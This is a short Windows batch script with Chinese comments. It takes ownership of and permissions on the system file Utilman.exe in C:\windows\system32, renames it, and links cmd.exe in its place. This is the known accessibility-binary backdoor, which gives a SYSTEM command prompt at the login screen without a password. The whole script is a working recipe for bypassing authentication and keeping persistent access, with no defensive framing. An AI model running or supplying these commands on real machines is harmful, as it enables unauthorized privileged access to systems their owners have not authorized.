:: 切换目录到 C:\windows\system32
cd C:\windows\system32

:: 更改文件名为 Utilman.exe 的所有者为当前用户；
takeown /f Utilman.exe

:: 将当前用户所在的组（管理员组）赋予完全访问权限；
icacls Utilman.exe /grant administrators:F

:: 将可执行文件 Utilman.exe 更名为 Utilman.exe.bak；
ren Utilman.exe Utilman.exe.bak

:: 生成名为 Utilman.exe 的链接指向 cmd.exe
mklink Utilman.exe cmd.exe